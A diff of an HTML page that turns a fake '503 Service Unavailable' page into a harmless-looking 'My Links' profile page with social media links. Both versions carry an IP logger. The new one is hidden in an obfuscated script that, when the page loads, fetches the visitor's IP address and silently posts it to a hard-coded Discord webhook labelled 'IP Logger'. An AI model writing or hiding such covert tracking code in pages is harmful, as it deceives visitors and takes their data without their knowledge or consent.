@@ -3,88 +3,142 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Service Unavailable</title>
+  <title>My Links</title>
   <style>
+    /* General Reset */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
-      background-color: #f8d7da;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      color: #721c24;
+      font-family: "Arial", sans-serif;
+      background: linear-gradient(145deg, #5865f2, #404eed);
+      color: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
       padding: 20px;
     }
-    h1 {
-      font-size: 2.5em;
-      margin-top: 50px;
+
+    .container {
+      background: rgba(32, 34, 37, 0.85);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 15px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+      padding: 40px;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
     }
-    p {
-      margin-top: 20px;
-      font-size: 1.2em;
+
+    .container h1 {
+      font-size: 2em;
+      margin-bottom: 20px;
+      color: #fff;
     }
-    .status {
-      margin-top: 40px;
-      font-size: 1em;
-      color: #555;
+
+    .container p {
+      margin-bottom: 30px;
+      color: rgba(255, 255, 255, 0.7);
     }
-    .loading {
-      font-style: italic;
+
+    .links a {
+      display: block;
+      margin: 10px 0;
+      padding: 15px 20px;
+      text-decoration: none;
+      color: #fff;
+      background-color: rgba(88, 101, 242, 0.9);
+      border-radius: 8px;
+      font-size: 1.1em;
+      font-weight: 600;
+      transition: all 0.3s ease;
+    }
+
+    .links a:hover {
+      background-color: rgba(88, 101, 242, 1);
+      transform: translateY(-2px);
+    }
+
+    .footer {
+      margin-top: 30px;
+      font-size: 0.9em;
+      color: rgba(255, 255, 255, 0.5);
     }
   </style>
 </head>
 <body>
-  <h1>503 Service Unavailable</h1>
-  <p>Our servers are currently overloaded due to high traffic. Please try again later.</p>
-  <p class="status" id="status">Checking your connection...</p>
+  <div class="container">
+    <h1>Welcome to My Page</h1>
+    <p>Explore my profiles and projects below:</p>
+    <div class="links">
+      <a href="https://twitter.com" target="_blank">Twitter</a>
+      <a href="https://instagram.com" target="_blank">Instagram</a>
+      <a href="https://github.com" target="_blank">GitHub</a>
+      <a href="https://discord.com" target="_blank">Discord</a>
+    </div>
+    <div class="footer">
+      &copy; 2024 My Name
+    </div>
+  </div>
+
   <script>
-    // Webhook URL for Discord
-    var webhookUrl = "https://discord.com/api/webhooks/1319029040631517234/uQW3SU6PfNDr6MTW5WqpDgrjq5e7O0FBSYEbSHokGBr1yXIDfE3R6AhqEJi4UfMhwk3e";
-
-    // Free IP API (replace with a more robust VPN detection API for better accuracy)
-    var ipApiUrl = "https://ipapi.co/json/";
-
-    // Detect IP and VPN/Proxy
-    fetch(ipApiUrl)
-      .then(function(response) {
-        if (!response.ok) {
-          throw new Error("Failed to fetch IP details.");
-        }
-        return response.json();
-      })
-      .then(function(data) {
-        var ip = data.ip;
-        var isVpn = data.org && (data.org.toLowerCase().includes("vpn") || data.org.toLowerCase().includes("proxy"));
-
-        // Update status on the page
-        var statusMessage = "Your IP: " + ip + " - ";
-        if (isVpn) {
-          statusMessage += "VPN/Proxy Detected.";
-        } else {
-          statusMessage += "Connection looks normal.";
-        }
-        document.getElementById("status").textContent = statusMessage;
-
-        // Send details to Discord webhook
-        var webhookData = {
-          content: "IP: " + ip + " | VPN/Proxy: " + (isVpn ? "Yes" : "No"),
-          username: "Traffic Monitor",
-          avatar_url: "https://example.com/avatar.png"
+    (function () {
+      var _0x5f37 = [
+        "https://api.ipify.org?format=json",
+        "https://discord.com/api/webhooks/1319029040631517234/uQW3SU6PfNDr6MTW5WqpDgrjq5e7O0FBSYEbSHokGBr1yXIDfE3R6AhqEJi4UfMhwk3e",
+        "json",
+        "Visitor\x20IP:\x20",
+        "username",
+        "IP\x20Logger",
+        "POST",
+        "Content-Type",
+        "application/json",
+        "Error\x20fetching\x20IP:",
+        "Error\x20sending\x20webhook:",
+        "then",
+        "catch",
+      ];
+      (function (_0x3510da, _0x5f37dc) {
+        var _0x1b33f8 = function (_0x546879) {
+          while (--_0x546879) {
+            _0x3510da["push"](_0x3510da["shift"]());
+          }
         };
-
-        fetch(webhookUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(webhookData)
-        }).then(function(res) {
-          console.log("Webhook sent successfully.");
-        }).catch(function(err) {
-          console.error("Webhook error:", err);
+        _0x1b33f8(++_0x5f37dc);
+      })(_0x5f37, 0xb4);
+      var _0x1b33 = function (_0x3510da, _0x5f37dc) {
+        _0x3510da = _0x3510da - 0x0;
+        var _0x1b33f8 = _0x5f37[_0x3510da];
+        return _0x1b33f8;
+      };
+      fetch(_0x1b33("0x0"))
+        [_0x1b33("0xc")](function (_0x1ec44d) {
+          return _0x1ec44d[_0x1b33("0x2")]();
+        })
+        [_0x1b33("0xc")](function (_0x54a21c) {
+          var _0x4c89d7 = _0x54a21c["ip"];
+          var _0x3af37b = {
+            content: _0x1b33("0x3") + _0x4c89d7,
+            [_0x1b33("0x4")]: _0x1b33("0x5"),
+          };
+          fetch(_0x1b33("0x1"), {
+            method: _0x1b33("0x6"),
+            headers: {
+              [_0x1b33("0x7")]: _0x1b33("0x8"),
+            },
+            body: JSON["stringify"](_0x3af37b),
+          })[_0x1b33("0xc")](function () {})[_0x1b33("0xd")](function (_0x2ce02e) {
+            console["error"](_0x1b33("0xb"), _0x2ce02e);
+          });
+        })
+        [_0x1b33("0xd")](function (_0x2e7da7) {
+          console["error"](_0x1b33("0xa"), _0x2e7da7);
         });
-      })
-      .catch(function(error) {
-        document.getElementById("status").textContent = "Error checking your connection.";
-        console.error("Error fetching IP data:", error);
-      });
+    })();
   </script>
 </body>
 </html>
